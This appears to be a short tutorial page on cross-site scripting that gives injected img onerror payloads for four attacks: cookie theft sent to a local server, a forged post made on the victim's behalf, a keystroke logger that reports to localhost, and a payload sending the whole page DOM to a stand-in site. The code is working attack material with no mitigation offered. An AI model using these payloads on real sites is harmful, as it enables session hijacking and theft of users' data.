# Security

### User Session Hijacking

User Session hacking by sending in the user cookie to hack personal login info (cookie, token)

```let query = encodeURIComponent('<img src="does-not-exist" onerror="var img = document.createElement('img');
                img.src = `http://127.0.0.1:5500/cookie?data=${encodeURIComponent(document.cookie)}`;
                document.querySelector(\'body\').appendChild(img);">');
```

If the user hits the above query url the cookie is sent to the external url http://127.0.0.1:5500/cookie:

![User Seesion/cookie hijacking](/Security/XSS/images/userSessionHijacking.png)

### UnAuthorised Access/Activities

The hacker might do unwanted activities like in below case the function to create the post is called,

```let query =  encodeURIComponent('<img src="does-not-exist"
  onerror="createPost('This is very bad title','You are Terminated! hacked! Good Bye!!')"/>');
```

If the user hits the above query with url a unwanted post is created on behalf of the user
![User Unathorised access](/Security/XSS/images/unauthorizedAccess.png)

### Capturing key Strokes

The example below shows how the hacker would be able to trace each key which is pressed by the user

```
let query = encodeURIComponent('<img src="does-not-exist" onerror="var timeout; var buffer = \'\';
document.querySelector(\'body\').addEventListener(\'keypress\', function (event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which);
timeout = setTimeout(function () { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">')
```

![User Unathorised access](/Security/XSS/images/capturingkeystrokes.png)

### Stealing Critical Info.

The example below shows how the full DOM can be accessed by a hacker

```
let query = encodeURIComponent('<img src="does-not-exist" onerror=\"new Image().src=`https://www.fakewebsite.com/output=${document.body.innerHTML}`\"/>')
```

![User Unathorised access](</Security/XSS/images/stealingCriticalInfo(full%20DOM).png>)

If the user hits the above query mistakenly the whole DOM is sent to the hacker.
